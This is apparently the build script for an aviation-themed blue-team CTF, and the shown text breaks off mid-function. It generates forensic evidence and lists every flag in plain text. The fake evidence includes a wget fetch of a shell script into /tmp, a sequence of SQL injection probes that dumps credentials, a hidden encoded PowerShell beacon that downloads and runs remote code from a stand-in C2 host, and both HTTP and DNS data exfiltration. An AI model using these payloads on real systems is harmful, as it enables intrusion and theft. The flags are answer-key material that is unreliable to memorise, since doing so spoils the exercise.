#!/usr/bin/env python3
"""Generate every challenge file for the Avians practice CTF.

    python3 generator/build.py

Writes evidence into challenges/<id>/ and flag hashes into portal/flags.js.
SPOILER WARNING: this file contains every flag in plain text. Don't read it
if you want to solve the challenges yourself.
"""
import base64
import codecs
import gzip
import hashlib
import io
import json
import os
import random
import shutil
import struct
import subprocess
import sys
import tarfile
import zipfile
import zlib
from datetime import datetime, timedelta, timezone

sys.path.insert(0, os.path.dirname(__file__))
from pcaplib import Pcap, TcpSession, dns_query, dns_response  # noqa: E402
from adsblib import df17, ident_me, velocity_me  # noqa: E402

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
OUT = os.path.join(ROOT, "challenges")
FLAGS = {}

random.seed(1337)
BASE = datetime(2026, 11, 14, 6, 0, 0, tzinfo=timezone.utc)
T0 = BASE.timestamp()


def cdir(cid):
    d = os.path.join(OUT, cid)
    os.makedirs(d, exist_ok=True)
    return d


def wtext(cid, name, text):
    with open(os.path.join(cdir(cid), name), "w", newline="\n") as f:
        f.write(text)


def wbin(cid, name, data):
    with open(os.path.join(cdir(cid), name), "wb") as f:
        f.write(data)


def flag(cid, value):
    FLAGS[cid] = value


AIRLINES = ["SNX", "BEL", "KLM", "DLH", "AFR", "BAW", "TAP", "SWR", "EZY", "RYR", "AUA", "SAS"]
AIRPORTS = ["EBBR", "EGLL", "LFPG", "EHAM", "EDDF", "LEMD", "LIRF", "LSZH", "EKCH", "LPPT", "LOWW", "EDDM"]
FIRST = ["Lena", "Tom", "Ines", "Pieter", "Sofia", "Mehdi", "Anouk", "Jonas", "Clara", "Bram",
         "Eva", "Lucas", "Nora", "Arne", "Julie", "Kobe", "Amira", "Noah", "Elise", "Victor"]
LAST = ["Peeters", "Janssens", "Maes", "Jacobs", "Mertens", "Willems", "Claes", "Goossens",
        "Wouters", "De Smet", "Dubois", "Lambert", "Dupont", "Martin", "Leroy", "Vermeulen"]


# ---------------------------------------------------------------------------
# Shared resources
# ---------------------------------------------------------------------------
def shared_wordlist():
    words = ["boeing", "airbus", "cessna", "skyhawk", "piper", "embraer", "fokker", "concorde",
             "runway", "taxiway", "tarmac", "hangar", "cockpit", "aileron", "rudder", "flaps",
             "landinggear", "autopilot", "altimeter", "transponder", "squawk", "mayday", "roger",
             "wilco", "clearance", "approach", "takeoff", "brussels", "zaventem", "pilot", "captain",
             "copilot", "airport", "jetstream", "contrail", "turbine", "propeller", "fuselage",
             "cargo", "baggage", "boarding", "gate", "terminal", "radar", "tower", "atc", "eurocontrol",
             "skyteam", "avians", "falcon", "eagle", "condor", "albatross", "pelican", "swallow"]
    out = set()
    for w in words:
        out.add(w)
        out.add(w.capitalize())
        for n in ["1", "12", "123", "2024", "2025", "2026", "!", "01", "7", "737", "747", "172", "320", "380"]:
            out.add(w + n)
            out.add(w.capitalize() + n)
    common = ["password", "123456", "qwerty", "letmein", "welcome", "admin", "iloveyou", "dragon",
              "monkey", "football", "sunshine", "princess", "shadow", "master", "trustno1"]
    for c in common:
        out.add(c)
        out.add(c + "1")
        out.add(c + "123")
    lst = sorted(out)
    random.shuffle(lst)
    os.makedirs(os.path.join(OUT, "_shared"), exist_ok=True)
    with open(os.path.join(OUT, "_shared", "aviation_wordlist.txt"), "w") as f:
        f.write("\n".join(lst) + "\n")
    return lst


# ---------------------------------------------------------------------------
# 01 Pre-flight: base64 boarding pass
# ---------------------------------------------------------------------------
def c_boarding_pass():
    cid = "01-boarding-pass"
    fl = "AVIANS{welcome_aboard_cleared_for_takeoff}"
    flag(cid, fl)
    encoded = base64.b64encode(fl.encode()).decode()
    wtext(cid, "boarding_pass.txt", f"""\
================================================================
  AVIANS PRACTICE AIRLINES                 BOARDING PASS
================================================================
  PASSENGER : DEFENDER/BLUE TEAM MR
  FLIGHT    : AV1337        DATE : 30NOV26
  FROM      : EBBR BRUSSELS
  TO        : CTF  CAPTURE THE FLAG
  GATE      : B42           SEAT : 1A
  BOARDING  : 0900          CLASS: Z
----------------------------------------------------------------
  SECURITY CODE (encoded, do not lose):
  {encoded}
================================================================
""")


# ---------------------------------------------------------------------------
# 02 Pre-flight: file type lies
# ---------------------------------------------------------------------------
def c_mystery_cargo():
    cid = "02-mystery-cargo"
    fl = "AVIANS{file_extensions_lie}"
    flag(cid, fl)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("cargo/ULD_AKE12345SN.txt",
                   "Unit Load Device AKE12345SN\nContents: 14 parcels, 312 kg\nDG: none\n")
        z.writestr("cargo/customs_note.txt",
                   "Customs inspection complete.\nInspector reference: " + fl + "\n")
    wbin(cid, "cargo_manifest.pdf", buf.getvalue())


# ---------------------------------------------------------------------------
# 03 Pre-flight: strings in firmware
# ---------------------------------------------------------------------------
def c_fmc_firmware():
    cid = "03-fmc-firmware"
    fl = "AVIANS{fmc_str1ngs_n0t_s0_h1dden}"
    flag(cid, fl)
    blob = bytearray()
    rnd = random.Random(42)
    blob += b"\x7fELF\x02\x01\x01" + bytes(rnd.getrandbits(8) for _ in range(4000))
    blob += b"FMC-OS v4.2.1 (c) Avians Avionics\x00"
    blob += bytes(rnd.getrandbits(8) for _ in range(9000))
    blob += b"/usr/lib/navdb/AIRAC2611.dat\x00"
    blob += bytes(rnd.getrandbits(8) for _ in range(7000))
    blob += b"debug_password=" + fl.encode() + b"\x00"
    blob += bytes(rnd.getrandbits(8) for _ in range(12000))
    blob += b"ERROR: ARINC 429 bus timeout on label 310\x00"
    blob += bytes(rnd.getrandbits(8) for _ in range(6000))
    blob += b"AVIANS{this_is_a_decoy_flag}"[:20] + b"\x00"  # truncated decoy, not a valid flag
    blob += bytes(rnd.getrandbits(8) for _ in range(3000))
    wbin(cid, "fmc_firmware.bin", bytes(blob))


# ---------------------------------------------------------------------------
# 04 Network: FTP credentials in clear text
# ---------------------------------------------------------------------------
def c_ftp():
    cid = "04-ftp-ground-ops"
    password = "Tarmac#Brussels26"
    fl = "AVIANS{" + password + "}"
    flag(cid, fl)
    p = Pcap(T0 + 3600 * 2)
    # some background noise: DNS + a short HTTP
    for i in range(6):
        q = random.choice(["weather.avians.local", "ops-portal.avians.local", "time.avians.local", "ntp.avians.local"])
        qid = random.randint(1, 65000)
        p.udp("10.10.20.15", 50000 + i, "10.10.0.2", 53, dns_query(qid, q), dt=0.4)
        p.udp("10.10.0.2", 53, "10.10.20.15", 50000 + i, dns_response(qid, q, "10.10.0.%d" % (20 + i)), dt=0.002)
    s = TcpSession(p, "10.10.20.15", 51432, "10.10.5.21", 21).handshake()
    s.server(b"220 GroundOps FTP server (vsFTPd 3.0.5) ready.\r\n")
    s.client(b"USER fuelops\r\n", dt=1.2)
    s.server(b"331 Please specify the password.\r\n")
    s.client(b"PASS " + password.encode() + b"\r\n", dt=2.1)
    s.server(b"230 Login successful.\r\n")
    s.client(b"SYST\r\n")
    s.server(b"215 UNIX Type: L8\r\n")
    s.client(b"PWD\r\n")
    s.server(b'257 "/home/fuelops" is the current directory\r\n')
    s.client(b"TYPE I\r\n")
    s.server(b"200 Switching to Binary mode.\r\n")
    s.client(b"PASV\r\n")
    s.server(b"227 Entering Passive Mode (10,10,5,21,156,64).\r\n")
    d = TcpSession(p, "10.10.20.15", 51433, "10.10.5.21", 40000).handshake()
    s.client(b"RETR fuel_uplift_EBBR_20261114.csv\r\n")
    s.server(b"150 Opening BINARY mode data connection for fuel_uplift_EBBR_20261114.csv (412 bytes).\r\n")
    rows = ["flight,stand,uplift_kg,truck"]
    for _ in range(12):
        rows.append("%s%d,%s%d,%d,FT-%02d" % (random.choice(AIRLINES), random.randint(100, 9999),
                                             random.choice("ABT"), random.randint(1, 60),
                                             random.randint(2000, 30000), random.randint(1, 18)))
    d.server(("\n".join(rows) + "\n").encode())
    d.close()
    s.server(b"226 Transfer complete.\r\n")
    s.client(b"QUIT\r\n", dt=3)
    s.server(b"221 Goodbye.\r\n")
    s.close()
    p.save(os.path.join(cdir(cid), "ground_ops.pcap"))


# ---------------------------------------------------------------------------
# 05 Network: HTTP exfiltration of manifest
# ---------------------------------------------------------------------------
def http_get(p, cip, cport, sip, host, path, body, ctype="text/html"):
    s = TcpSession(p, cip, cport, sip, 80).handshake()
    s.client(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\n\r\n".encode())
    s.server(f"HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: {ctype}\r\nContent-Length: {len(body)}\r\n\r\n".encode() + body)
    s.close()


def c_manifest_exfil():
    cid = "05-manifest-exfil"
    fl = "AVIANS{manifest_left_the_building}"
    flag(cid, fl)
    p = Pcap(T0 + 3600 * 5)
    client = "10.20.30.44"
    for i in range(5):
        http_get(p, client, 52000 + i, "10.20.0.80", "intranet.avians.local", random.choice(
            ["/", "/news", "/roster", "/fuel", "/weather/METAR/EBBR"]),
            b"<html><body><h1>Avians intranet</h1><p>Nothing to see here.</p></body></html>")
        p.advance(random.uniform(2, 8))
    rows = ["pnr,last_name,first_name,seat,flight,date,doc_number"]
    for i in range(40):
        rows.append("%s,%s,%s,%d%s,SNX%d,2026-11-14,%s%07d" % (
            "".join(random.choice("ABCDEFGHJKLMNPQRSTUVWXYZ23456789") for _ in range(6)),
            random.choice(LAST), random.choice(FIRST), random.randint(1, 32), random.choice("ABCDEF"),
            random.choice([2401, 2403, 2405]), random.choice(["EB", "EN", "EJ"]), random.randint(0, 9999999)))
    rows.insert(23, "Z9Z9Z9,EXFIL,MARKER,0X,SNX0000,2026-11-14," + fl)
    csvdata = ("\n".join(rows) + "\n").encode()
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"pax_manifest_SNX2401.csv\"\r\n"
            f"Content-Type: text/csv\r\n\r\n").encode() + csvdata + f"\r\n--{boundary}--\r\n".encode()
    s = TcpSession(p, client, 52100, "45.133.1.77", 80).handshake()
    s.client((f"POST /upload.php HTTP/1.1\r\nHost: files-sharing-cdn.xyz\r\nUser-Agent: curl/8.5.0\r\n"
              f"Content-Type: multipart/form-data; boundary={boundary}\r\nContent-Length: {len(body)}\r\n\r\n").encode() + body)
    resp = b'{"status":"ok","stored":"pax_manifest_SNX2401.csv"}'
    s.server(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n" % len(resp) + resp)
    s.close()
    for i in range(3):
        p.advance(random.uniform(2, 8))
        http_get(p, client, 52200 + i, "10.20.0.80", "intranet.avians.local", "/roster",
                 b"<html><body><h1>Crew roster</h1></body></html>")
    p.save(os.path.join(cdir(cid), "terminal_b_workstation.pcap"))


# ---------------------------------------------------------------------------
# 06 Network: DNS tunnelling
# ---------------------------------------------------------------------------
def c_dns():
    cid = "06-dns-contrails"
    fl = "AVIANS{dns_tunnels_fly_under_radar}"
    flag(cid, fl)
    p = Pcap(T0 + 3600 * 7)
    client, resolver = "10.30.1.17", "10.30.0.53"
    secret = ("crew-schedule-leak;" + fl).encode().hex()
    chunks = [secret[i:i + 30] for i in range(0, len(secret), 30)]
    normal = ["www.google.com", "outlook.office365.com", "eurocontrol.int", "www.brusselsairport.be",
              "aviationweather.gov", "teams.microsoft.com", "update.microsoft.com", "www.flightradar24.com",
              "login.microsoftonline.com", "cdn.jsdelivr.net"]
    events = []
    for i, ch in enumerate(chunks):
        events.append(("tun", f"{ch}.{i:02d}.cdn-weather-update.net"))
    for _ in range(60):
        events.append(("norm", random.choice(normal)))
    # keep tunnel order but interleave noise
    tun = [e for e in events if e[0] == "tun"]
    nor = [e for e in events if e[0] == "norm"]
    merged = []
    while tun or nor:
        if tun and (not nor or random.random() < 0.3):
            merged.append(tun.pop(0))
        else:
            merged.append(nor.pop(0))
    for kind, name in merged:
        qid = random.randint(1, 65000)
        sport = random.randint(49152, 65000)
        p.udp(client, sport, resolver, 53, dns_query(qid, name, 16 if kind == "tun" else 1), dt=random.uniform(0.2, 3))
        if kind == "tun":
            p.udp(resolver, 53, client, sport, dns_response(qid, name, "ack", 16))
        else:
            p.udp(resolver, 53, client, sport, dns_response(qid, name, "93.184.%d.%d" % (random.randint(1, 250), random.randint(1, 250))))
    p.save(os.path.join(cdir(cid), "crew_lounge_dns.pcap"))


# ---------------------------------------------------------------------------
# 07 Network: port scan
# ---------------------------------------------------------------------------
def c_scan():
    cid = "07-radar-sweep"
    scanner, target = "203.0.113.66", "10.40.0.12"
    fl = "AVIANS{203.0.113.66:502}"
    flag(cid, fl)
    p = Pcap(T0 + 3600 * 9)
    # background: legit monitoring traffic to port 443
    for i in range(10):
        s = TcpSession(p, "10.40.0.200", 40000 + i, target, 443).handshake()
        s.client(random.randbytes(200))
        s.server(random.randbytes(800))
        s.close()
        p.advance(0.5)
    # a second, noisy-but-harmless host doing ping-like ICMP? keep TCP only; a decoy scanner with few ports, all closed
    ports = list(range(1, 1025)) + [1883, 2404, 3389, 5900, 8080, 8443, 20000, 44818, 47808]
    random.shuffle(ports)
    open_ports = {502}
    for port in ports:
        sp = random.randint(40000, 65000)
        seq = random.randint(1, 2**31)
        p.tcp(scanner, sp, target, port, seq, 0, "S", dt=0.0015, win=1024)
        if port in open_ports:
            sseq = random.randint(1, 2**31)
            p.tcp(target, port, scanner, sp, sseq, seq + 1, "SA", dt=0.0004)
            p.tcp(scanner, sp, target, port, seq + 1, 0, "R", dt=0.0002)
        elif port == 443:
            # 443 is filtered from outside: no answer
            pass
        else:
            p.tcp(target, port, scanner, sp, 0, seq + 1, "RA", dt=0.0004)
    # decoy: a second external IP touching 3 ports (all closed)
    for port in (22, 23, 80):
        sp = random.randint(40000, 65000)
        seq = random.randint(1, 2**31)
        p.tcp("198.51.100.200", sp, target, port, seq, 0, "S", dt=0.8)
        p.tcp(target, port, "198.51.100.200", sp, 0, seq + 1, "RA", dt=0.0004)
    p.save(os.path.join(cdir(cid), "baggage_ot_segment.pcap"))


# ---------------------------------------------------------------------------
# 08 Logs: SSH brute force
# ---------------------------------------------------------------------------
def c_bruteforce():
    cid = "08-brute-force-at-the-gate"
    attacker, user = "198.51.100.23", "opsadmin"
    fl = f"AVIANS{{{attacker}_{user}}}"
    flag(cid, fl)
    lines = []
    t = BASE.replace(hour=0)
    host = "flightplan-srv01"
    pid = 21000
    legit = [("10.50.1.%d" % i, u) for i, u in [(11, "dispatch"), (12, "dispatch"), (14, "lmaes"), (22, "backup")]]
    noisy = ["45.155.205.%d" % random.randint(2, 250) for _ in range(8)] + ["193.32.162.%d" % random.randint(2, 250) for _ in range(5)]
    usernames = ["root", "admin", "test", "oracle", "ubuntu", "pi", "user", "ftp", "postgres", "guest", "opsadmin", "dispatch"]

    def ts(t):
        return t.strftime("%b %d %H:%M:%S").replace(" 0", "  ", 1) if t.day < 10 else t.strftime("%b %d %H:%M:%S")

    events = []
    for _ in range(25):
        ip, u = random.choice(legit)
        events.append((t + timedelta(seconds=random.randint(0, 86000)), "legit", ip, u))
    for ip in noisy:
        start = t + timedelta(seconds=random.randint(0, 80000))
        for k in range(random.randint(20, 120)):
            events.append((start + timedelta(seconds=k * random.uniform(0.5, 3)), "fail", ip, random.choice(usernames)))
    start = t + timedelta(hours=3, minutes=12)
    for k in range(214):
        events.append((start + timedelta(seconds=k * 1.7), "fail", attacker, user if k > 40 else random.choice(usernames)))
    events.append((start + timedelta(seconds=215 * 1.7 + 3), "success", attacker, user))
    events.append((start + timedelta(seconds=215 * 1.7 + 50), "sudo", attacker, user))
    events.sort(key=lambda e: e[0])
    for when, kind, ip, u in events:
        pid += random.randint(1, 30)
        port = random.randint(30000, 65000)
        stamp = when.strftime("%b %d %H:%M:%S")
        if kind == "legit":
            lines.append(f"{stamp} {host} sshd[{pid}]: Accepted publickey for {u} from {ip} port {port} ssh2: ED25519 SHA256:{base64.b64encode(random.randbytes(32)).decode()[:43]}")
            lines.append(f"{stamp} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user {u}(uid=100{len(u)}) by (uid=0)")
        elif kind == "fail":
            if u in ("opsadmin", "dispatch", "root"):
                lines.append(f"{stamp} {host} sshd[{pid}]: Failed password for {u} from {ip} port {port} ssh2")
            else:
                lines.append(f"{stamp} {host} sshd[{pid}]: Failed password for invalid user {u} from {ip} port {port} ssh2")
            if random.random() < 0.1:
                lines.append(f"{stamp} {host} sshd[{pid}]: Disconnecting authenticating user {u} {ip} port {port}: Too many authentication failures [preauth]")
        elif kind == "success":
            lines.append(f"{stamp} {host} sshd[{pid}]: Accepted password for {u} from {ip} port {port} ssh2")
            lines.append(f"{stamp} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user {u}(uid=1005) by (uid=0)")
        elif kind == "sudo":
            lines.append(f"{stamp} {host} sudo: {u} : TTY=pts/1 ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.9/x.sh -O /tmp/.x.sh")
    for _ in range(40):
        when = t + timedelta(seconds=random.randint(0, 86000))
        lines.append(f"{when.strftime('%b %d %H:%M:%S')} {host} CRON[{random.randint(1000, 9000)}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
    lines.sort(key=lambda l: datetime.strptime("2026 " + l[:15], "%Y %b %d %H:%M:%S"))
    wtext(cid, "auth.log", "\n".join(lines) + "\n")


# ---------------------------------------------------------------------------
# 09 Logs: SQL injection in web access log
# ---------------------------------------------------------------------------
def c_sqli():
    cid = "09-booking-site-sqli"
    fl = "AVIANS{crew_accounts}"
    flag(cid, fl)
    from urllib.parse import quote
    lines = []
    t = BASE + timedelta(hours=4)
    agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
              "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15"]
    pages = ["/", "/flights/search?from=EBBR&to=LFPG&date=2026-11-20", "/flights/search?from=EBBR&to=EGLL&date=2026-11-21",
             "/static/app.js", "/static/style.css", "/checkin", "/booking?ref=K7Q2XP", "/destinations", "/baggage-info"]
    entries = []
    for _ in range(1500):
        ip = "%d.%d.%d.%d" % (random.choice([81, 85, 91, 109, 178, 212]), random.randint(1, 250), random.randint(1, 250), random.randint(1, 250))
        entries.append((t + timedelta(seconds=random.randint(0, 20000)), ip, "GET", random.choice(pages), 200, random.randint(800, 30000), random.choice(agents)))
    atk = "185.243.218.41"
    a_t = t + timedelta(hours=2, minutes=7)
    sqlmap_ua = "sqlmap/1.8.11#stable (https://sqlmap.org)"
    probes = ["1'", "1\"", "1' AND 1=1-- -", "1' AND 1=2-- -", "1' ORDER BY 1-- -", "1' ORDER BY 5-- -", "1' ORDER BY 3-- -",
              "1' UNION SELECT NULL,NULL,NULL-- -", "1' UNION SELECT 1,@@version,3-- -",
              "1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
              "1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='bookings'-- -",
              "1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='crew_accounts'-- -",
              "1' UNION SELECT 1,group_concat(username,0x3a,password_hash),3 FROM crew_accounts-- -"]
    sizes = [500, 500, 4211, 1320, 4211, 500, 4211, 4211, 4305, 4520, 4399, 4402, 18733]
    for k, (pr, sz) in enumerate(zip(probes, sizes)):
        entries.append((a_t + timedelta(seconds=k * 4), atk, "GET", "/flights/status?id=" + quote(pr, safe=""), 500 if sz == 500 else 200, sz, sqlmap_ua))
    # decoy: a scanner hitting non-existent admin pages
    for path in ["/wp-admin", "/phpmyadmin", "/.env", "/admin.php", "/.git/config"]:
        entries.append((t + timedelta(seconds=random.randint(0, 20000)), "45.95.147.236", "GET", path, 404, 162, "Mozilla/5.0 zgrab/0.x"))
    entries.sort(key=lambda e: e[0])
    for when, ip, m, path, st, sz, ua in entries:
        lines.append(f'{ip} - - [{when.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{m} {path} HTTP/1.1" {st} {sz} "-" "{ua}"')
    wtext(cid, "access.log", "\n".join(lines) + "\n")


# ---------------------------------------------------------------------------
# 10 Logs: PowerShell -enc in Sysmon JSON
# ---------------------------------------------------------------------------
def c_powershell():
    cid = "10-powershell-on-the-tarmac"
    fl = "AVIANS{utf16_base64_powershell_unmasked}"
    flag(cid, fl)
    script = ("$c2='http://efb-sync-update.com/api/v2/beacon';"
              "$id=$env:COMPUTERNAME;"
              "# operator note: " + fl + "\n"
              "while($true){$r=Invoke-WebRequest -UseBasicParsing \"$c2?h=$id\";"
              "if($r.Content){iex $r.Content};Start-Sleep -s 60}")
    enc = base64.b64encode(script.encode("utf-16-le")).decode()
    host = "GND-OPS-WS07.avians.local"
    procs = [("C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe"),
             ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
             ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "\"chrome.exe\" --type=renderer"),
             ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"),
             ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoProfile -Command Get-Service Spooler"),
             ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c ipconfig /all"),
             ("C:\\Program Files\\EFB\\EFBSync.exe", "\"C:\\Program Files\\EFB\\EFBSync.exe\" --sync charts")]
    evts = []
    t = BASE + timedelta(hours=6)
    for i in range(400):
        img, cmd = random.choice(procs)
        evts.append({"EventID": 1, "UtcTime": (t + timedelta(seconds=random.randint(0, 30000))).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                     "Computer": host, "User": "AVIANS\\j.peeters", "Image": img, "CommandLine": cmd,
                     "ParentImage": "C:\\Windows\\explorer.exe", "ProcessId": random.randint(1000, 15000)})
    for i in range(150):
        evts.append({"EventID": 3, "UtcTime": (t + timedelta(seconds=random.randint(0, 30000))).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                     "Computer": host, "Image": random.choice(procs)[0], "DestinationIp": "10.60.%d.%d" % (random.randint(0, 5), random.randint(2, 250)),
                     "DestinationPort": random.choice([443, 445, 389, 53, 88])})
    bad_t = t + timedelta(seconds=14321)
    evts.append({"EventID": 1, "UtcTime": bad_t.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "Computer": host, "User": "AVIANS\\j.peeters",
                 "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                 "CommandLine": "powershell.exe -nop -w hidden -enc " + enc,
                 "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ProcessId": 6644})
    evts.append({"EventID": 3, "UtcTime": (bad_t + timedelta(seconds=2)).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "Computer": host,
                 "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "DestinationIp": "203.0.113.180", "DestinationPort": 80})
    # decoy: a benign base64 one-liner from IT automation
    benign = base64.b64encode("Get-ChildItem C:\\Logs | Remove-Item -Recurse".encode("utf-16-le")).decode()
    evts.append({"EventID": 1, "UtcTime": (t + timedelta(seconds=2000)).strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "Computer": host,
                 "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                 "CommandLine": "powershell.exe -EncodedCommand " + benign, "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ProcessId": 3120})
    evts.sort(key=lambda e: e["UtcTime"])
    wtext(cid, "sysmon_gnd-ops-ws07.jsonl", "\n".join(json.dumps(e) for e in evts) + "\n")


# ---------------------------------------------------------------------------
# 11 + 12 ADS-B: ghost flight and impossible speed
# ---------------------------------------------------------------------------
def c_adsb():
    cid_g, cid_s = "11-ghost-flight", "12-supersonic-cessna"
    ghost = "XAV1337"
    flag(cid_g, "AVIANS{" + ghost + "}")
    fast_icao = 0x4B1A2F
    flag(cid_s, "AVIANS{4B1A2F}")
    fleet = []
    used = set()
    types = ["A320", "A20N", "B738", "A319", "E190", "B38M", "A321", "CRJ9", "AT76", "DH8D"]
    for i in range(24):
        icao = random.choice([0x440000, 0x448000, 0x484000, 0x3C4000, 0x400000, 0x4B0000]) + random.randint(0, 0x7FFF)
        while icao in used:
            icao += 1
        used.add(icao)
        cs = "%s%d%s" % (random.choice(AIRLINES), random.randint(10, 999), random.choice(["", "", "A", "K", "X"]))
        fleet.append({"icao": icao, "cs": cs[:7], "type": random.choice(types),
                      "dep": random.choice(AIRPORTS), "arr": "EBBR",
                      "vel": (random.randint(-300, 300), random.randint(-300, 300), random.choice([0, 0, -832, -1024, 640, 1216]))})
    # the Cessna with an impossible speed
    fleet.append({"icao": fast_icao, "cs": "OOSKY", "type": "C172", "dep": "EBAW", "arr": "EBKT", "vel": (980, 980, 0)})
    # a fast but plausible jet (decoy)
    fleet.append({"icao": 0x3C6DD5, "cs": "DLH9KT", "type": "A359", "dep": "EDDF", "arr": "KJFK", "vel": (-420, 260, 0)})
    # flight plans (the ghost is NOT here)
    plan_lines = ["callsign,icao24,aircraft_type,departure,destination,eobt"]
    for f in fleet:
        plan_lines.append("%s,%06X,%s,%s,%s,%s" % (f["cs"], f["icao"], f["type"], f["dep"], f["arr"],
                                                     (BASE + timedelta(minutes=random.randint(0, 300))).strftime("%H%M")))
    ghost_icao = 0x4B1999
    msgs = []
    t = T0 + 3600 * 8
    for step in range(60):
        for f in fleet:
            if random.random() < 0.35:
                msgs.append((t + random.uniform(0, 5), df17(f["icao"], ident_me(f["cs"]))))
            if random.random() < 0.5:
                vx, vy, vr = f["vel"]
                msgs.append((t + random.uniform(0, 5), df17(f["icao"], velocity_me(vx, vy, vr))))
        if step > 20 and random.random() < 0.6:
            msgs.append((t + random.uniform(0, 5), df17(ghost_icao, ident_me(ghost))))
            msgs.append((t + random.uniform(0, 5), df17(ghost_icao, velocity_me(-250, -200, -640))))
        if random.random() < 0.15:
            # corrupted receptions: garbage callsign with bad CRC (decoy)
            msgs.append((t + random.uniform(0, 5), df17(random.choice(fleet)["icao"], ident_me(random.choice(["XAV1888", "QQZ001", "TEST999"])), corrupt=True)))
        t += 5
    msgs.sort()
    lines = ["# dump1090 raw capture, receiver ADS-B-RX-BRU-03 (EBBR), unix_ts raw_hex"]
    lines += ["%.3f *%s;" % (ts, m) for ts, m in msgs]
    for cid in (cid_g, cid_s):
        wtext(cid, "adsb_capture_EBBR.txt", "\n".join(lines) + "\n")
        wtext(cid, "flight_plans.csv", "\n".join(plan_lines) + "\n")


# ---------------------------------------------------------------------------
# 13 Squawk codes
# ---------------------------------------------------------------------------
def c_squawk():
    cid = "13-squawk-alert"
    fl = "AVIANS{BEL3KX}"
    flag(cid, fl)
    rows = ["utc_time,icao24,callsign,squawk,alt_ft,gs_kt,lat,lon"]
    fl_list = []
    for i in range(30):
        fl_list.append(["%06X" % random.randint(0x400000, 0x4BFFFF), "%s%d" % (random.choice(AIRLINES), random.randint(100, 9999)),
                        "%04o" % random.randint(0o1000, 0o6777), random.randint(3000, 39000), random.randint(220, 480),
                        50.9 + random.uniform(-1, 1), 4.48 + random.uniform(-1.5, 1.5)])
    special = {"BEL3KX": "7500", "RYR82HA": "7700", "EZY44TQ": "7600"}
    for cs, sq in special.items():
        fl_list.append(["%06X" % random.randint(0x400000, 0x4BFFFF), cs, "%04o" % random.randint(0o1000, 0o6777),
                        random.randint(8000, 30000), random.randint(250, 420), 50.9 + random.uniform(-1, 1), 4.48 + random.uniform(-1.5, 1.5)])
    t = BASE + timedelta(hours=11)
    for k in range(120):
        for f in fl_list:
            sq = f[2]
            if f[1] in special and k > 40 + list(special).index(f[1]) * 15:
                sq = special[f[1]]
            f[5] += random.uniform(-0.03, 0.03)
            rows.append("%s,%s,%s,%s,%d,%d,%.4f,%.4f" % ((t + timedelta(seconds=k * 10)).strftime("%H:%M:%S"), f[0], f[1], sq,
                                                        f[3] + random.randint(-50, 50), f[4] + random.randint(-5, 5), f[5], f[6]))
    # sprinkle valid "normal" special codes too: 7000 VFR conspicuity, 2000
    wtext(cid, "transponder_log.csv", "\n".join(rows) + "\n")


# ---------------------------------------------------------------------------
# 14 ACARS chatter
# ---------------------------------------------------------------------------
def c_acars():
    cid = "14-acars-chatter"
    fl = "AVIANS{acars_is_not_encrypted}"
    flag(cid, fl)
    labels = {"H1": "Message to/from terminal", "_d": "General response", "Q0": "Link test", "SA": "Media advisory",
              "5Z": "Airline designated downlink", "80": "Airline designated (OOOI)", "QA": "OUT time", "B9": "ATIS request"}
    texts = ["/BRUOPXA.REQ WX EBBR", "METAR EBBR 141050Z 24012KT 9999 FEW030 09/04 Q1018 NOSIG",
             "OUT 1012 OFF 1019 FOB 0084", "ON 1254 IN 1301 FOB 0032", "REQ GATE ASSIGNMENT", "GATE B24 STAND 214",
             "CREW REQUEST CATERING 2 VEG MEALS", "MAINT: APU FAULT CODE 49-61-42 DEFERRED MEL 49-01",
             "ETA 1342 FUEL 4.2T", "PAX COUNT 168 + 2 INF", "ATIS EBBR INFO K RWY 25R ARR 25L DEP"]
    out = []
    t = BASE + timedelta(hours=10)
    regs = ["OO-SNA", "OO-SNE", "OO-SSU", "OO-JAQ", "PH-BXA", "D-AINK", "F-HBXE", "G-EUYT", "OO-TCH"]
